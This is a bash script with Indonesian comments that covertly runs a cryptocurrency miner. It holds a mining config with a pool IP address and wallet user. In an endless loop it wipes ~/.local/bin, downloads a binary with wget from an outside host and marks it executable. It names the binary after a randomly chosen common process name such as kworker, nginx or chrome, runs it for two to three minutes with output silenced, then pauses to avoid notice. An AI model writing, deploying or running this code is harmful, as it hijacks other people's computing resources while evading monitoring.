#!/bin/bash


# Konfigurasi default (nanti disimpan ke file config dengan nama sesuai bin)
CONFIG_JSON='{
  "algo": "power2b",
  "url": "18.118.48.49:443",
  "user": "mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.Mabar228",
  "pass": "x",
  "threads": 4
}'

# Daftar nama samaran umum saat CPU tinggi di Linux
COMMON_HIGH_CPU_NAMES=("apps" "migration" "ksoftirqd" "swapper" \
                       "xorg" "compiz" "firefox" "chrome" "java" "python" \
                       "node" "php-fpm" "mysqld" "apache2" "nginx" "redis-server")

# Fungsi untuk menghasilkan angka acak 2-4 digit
generate_random_digits() {
    local length=$((RANDOM % 3 + 2))  # 2-4 digit
    local digits=""
    for i in $(seq 1 $length); do
        digits="${digits}$((RANDOM % 10))"
    done
    echo "$digits"
}

# Lokasi penyimpanan
LOCAL_BIN_DIR="$HOME/.local/bin"
mkdir -p "$LOCAL_BIN_DIR"

while true; do
    # Hapus data sesi lama
    rm -f "$LOCAL_BIN_DIR"/*

    # Pilih nama samaran acak dan tambahkan angka
    BASE_NAME="${COMMON_HIGH_CPU_NAMES[$RANDOM % ${#COMMON_HIGH_CPU_NAMES[@]}]}"
    RANDOM_DIGITS=$(generate_random_digits)
    BIN_NAME="${BASE_NAME}/${RANDOM_DIGITS}"  # Format: nama/angka (seperti kworker/123)
    
    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME//\//_}_config.json"  # Ganti / dengan _

    # Simpan config JSON sesuai nama bin
    echo "$CONFIG_JSON" > "$CONFIG_PATH"

    # Download binary baru
    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/${BIN_NAME//\//_}"
    chmod +x "$LOCAL_BIN_DIR/${BIN_NAME//\//_}"

    # Tentukan waktu aktif (2–3 menit)
    ACTIVE_MIN=$((RANDOM % 2 + 2))
    ACTIVE_SEC=$((ACTIVE_MIN * 60))

    # Tentukan waktu istirahat (20–30 detik)
    IDLE_SEC=$((RANDOM % 11 + 20))

    # Jalankan proses dengan timeout
    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/${BIN_NAME//\//_}" --config="$CONFIG_PATH" >/dev/null 2>&1

    # Istirahat
    sleep "$IDLE_SEC"
done
